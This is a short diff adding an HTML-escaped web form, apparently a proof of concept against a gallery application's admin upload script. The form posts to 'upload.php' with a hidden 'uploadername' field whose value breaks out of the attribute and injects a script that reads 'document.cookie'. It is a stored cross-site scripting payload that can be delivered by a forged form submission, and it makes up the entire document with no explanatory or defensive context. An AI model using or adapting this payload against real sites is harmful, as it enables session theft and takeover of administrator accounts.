@@ -1,0 +1,4 @@
+&lt;form action=&quot;http://www.example.com/admin/upload.php?albumID=1&amp;parentID=0&amp;request=single&quot; method=&quot;post&quot; name=&quot;main&quot; id=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uploadername&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;OK&quot;&gt;
+&lt;/form&gt;
